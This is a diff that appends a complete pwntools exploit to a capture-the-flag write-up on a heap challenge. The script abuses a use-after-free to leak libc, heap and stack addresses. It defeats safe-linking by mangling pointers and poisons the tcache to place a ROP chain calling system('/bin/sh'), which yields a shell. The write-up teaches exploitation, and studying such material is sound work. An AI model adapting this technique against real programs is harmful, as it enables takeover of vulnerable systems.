@@ -386,6 +386,137 @@ Execution returns into our chain, and we get a shell.
 
 At this point, the allocator is no longer a defense.
 
+## Full Exploit
+
+```py
+from pwn import *
+import sys
+
+# fileName = './chall'
+fileName = './chall_patched'
+
+e = ELF(fileName)
+libc = e.libc
+context.arch = 'amd64'
+p = process(fileName)
+
+
+if 'd' in sys.argv:
+    gdb.attach(p,'''
+        b *main
+    ''')
+
+if 'r' in sys.argv:
+    p = remote('')
+
+
+def malloc(index,size,data) :
+    p.sendlineafter("> ","1")
+    p.sendlineafter("Index: ",str(index))
+    p.sendlineafter("Size: ",str(size))
+    p.sendlineafter("Data: ",data)
+
+
+
+def free(idx) :
+    p.sendlineafter("> ","2")
+    p.sendlineafter("Index: ",str(idx))
+
+
+
+def read(idx) :
+    p.sendlineafter("> ","3")
+    p.sendlineafter("Index: ",str(idx))
+
+
+
+def edit(index,data) :
+    p.sendlineafter("> ","4")
+    p.sendlineafter("Index: ",str(index))
+    p.sendlineafter("New Data: ",data)
+
+
+
+
+for i in range(9):
+    malloc(i, 0x88, b'asdf')
+
+
+for i in range(7):
+    free(i)
+
+free(7) # unsorted bin
+
+read(7)
+
+p.recvuntil("Data: ")
+leak = u64(p.recvline()[:8].ljust(8,b'\x00'))
+log.success(f'This is libc leak = {hex(leak)}')
+
+base = leak - 0x1e7ba0
+libc.address = base
+
+log.success(f'This is libc base = {hex(libc.address)}')
+
+malloc(0, 0x48, 'ffffffffffff')
+free(0)
+
+read(0)
+
+p.recvuntil("Data: ")
+leak = u64(p.recvline()[:8].ljust(8,b'\x00'))
+heap = leak << 12
+log.success(f'This is heap leak = {hex(leak)}')
+
+
+environ = libc.sym.environ
+
+chunk_add = heap + 0x700
+mang = (chunk_add >> 12) ^ (environ-24)
+
+edit(0, p64(mang))
+
+malloc(0, 0x48, 'aaaa')
+
+payload = p64(0xdaedbeefdeadbeef)
+payload += p64(0xdaedbeefdeadbeef)
+payload += p64(0xdaedbeefdeadbeef)
+p.sendlineafter("> ","1")
+p.sendlineafter("Index: ",'0')
+p.sendlineafter("Size: ",'72')
+p.sendafter("Data: ",payload)
+
+
+read(0)
+
+print(p.recvline)
+leak = u64(p.recvline()[30:38].ljust(8,b'\x00'))
+log.success(f'This is stack leak = {hex(leak)}')
+
+
+malloc(0, 0x58, 'cccccc')
+free(0)
+
+rsp = leak - 336
+
+payload = (chunk_add >> 12) ^ (rsp-8)
+edit(0, p64(payload))
+
+pop_rdi = libc.address + 0x0000000000102dea
+ret = libc.address + 0x00000000000efc6b
+
+malloc(0, 0x58, 'aaaaa')
+payload = p64(0xdeadbeef)
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(next(libc.search(b'/bin/sh\x00')))
+payload += p64(libc.sym.system)
+malloc(0, 0x58, payload)
+
+
+p.interactive()
+```
+
 ## Conclusion 🏆
 
 Heap exploitation challenge: use-after-free, leaks, safe-linking bypass, and memory manipulation to achieve code execution by understanding allocator behavior. The next challenge (**six-seven-revenge**) is harder: no **use-after-free**, no **heap overflow** or **double free**, freed pointers are cleared, and seccomp restricts system calls.
